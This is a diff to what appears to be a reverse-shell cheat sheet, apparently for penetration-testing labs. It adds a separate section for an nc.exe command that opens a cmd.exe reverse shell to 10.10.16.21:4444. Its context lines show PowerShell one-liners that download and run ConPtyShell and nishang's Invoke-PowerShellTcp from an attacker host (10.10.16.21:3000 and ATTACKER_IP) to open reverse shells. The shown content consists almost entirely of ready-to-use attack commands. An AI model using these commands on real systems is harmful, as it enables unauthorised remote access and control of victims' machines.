@@ -11,6 +11,11 @@ IEX(IWR http://10.10.16.21:3000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke
 
 ```
 
+## nc.exe
+```powershell
+nc.exe -nv 10.10.16.21 4444 -e cmd.exe
+```
+
 ## nishang
 ```sh
 cd /nishang/Shells/  --> Invoke-PowerShellTcp.ps1
@@ -32,11 +37,6 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.16.21:3000/
 IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
 Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
 ```
-
-```
-nc.exe -nv 10.10.16.21 4444 -e cmd.exe
-```
-
 
 ## socat
 Interactive shell
